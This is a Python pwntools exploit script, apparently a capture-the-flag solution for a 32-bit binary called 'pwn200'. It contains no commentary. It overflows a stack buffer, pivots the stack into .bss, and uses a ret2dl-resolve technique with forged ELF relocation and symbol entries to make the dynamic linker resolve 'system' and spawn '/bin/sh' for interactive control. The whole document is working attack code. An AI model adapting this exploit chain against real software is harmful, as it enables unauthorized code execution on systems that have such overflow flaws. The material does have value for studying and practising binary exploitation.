from pwn import *
context.arch="i386"
elf = ELF('./pwn200')
gadget = lambda x: next(elf.search(asm(x, os='linux', arch='i386')))
p = process('./pwn200')
stack_privot  = gadget("leave; ret")

bss = 0x0804c028+0x600 - 8
read_plt = 0x080490A4

p.send(b"A"*108 + b''.join(p32(i) for i in [bss, # ebp
                                            read_plt,  # call read
                                            stack_privot, # leave; ret
                                            0, bss, 0x400
                                            ]))

ELF32_sym = 0x8048248
dynstr = 0x80482e8
rel_plt = 0x080483a0
resolve_plt = 0x8049030
fake_ptr = bss + 0x200

r_info =  (((fake_ptr + 8 - ELF32_sym))//0x10)*0x100 + 0x7

# typedef struct
# {
#   Elf32_Addr    r_offset;
#   Elf32_Word    r_info;
# } Elf32_Rel
fake_Elf32_Rel = b''.join(p32(i) for i in [
    bss - 0x100, # fake r_offset
    r_info # fake r_info
])

st_name = fake_ptr + len(fake_Elf32_Rel) + 16 - dynstr
fake_Elf32_Sym=b''.join(p32(i) for i in [
    st_name,
    0,
    0,
]) + p8(0x12) + p8(0) + p16(0)

strings = b"system\x00/bin/sh\x00\x00"


fake_rel_offset = fake_ptr - rel_plt
fake_bin_sh = fake_ptr + len(fake_Elf32_Rel) + len(fake_Elf32_Sym) + 7

rop_chain = b''.join(p32(i) for i in [0, resolve_plt, fake_rel_offset, 0, fake_bin_sh]).ljust(0x200, b'\x00')

p.send(rop_chain + fake_Elf32_Rel + fake_Elf32_Sym + strings)
p.interactive()
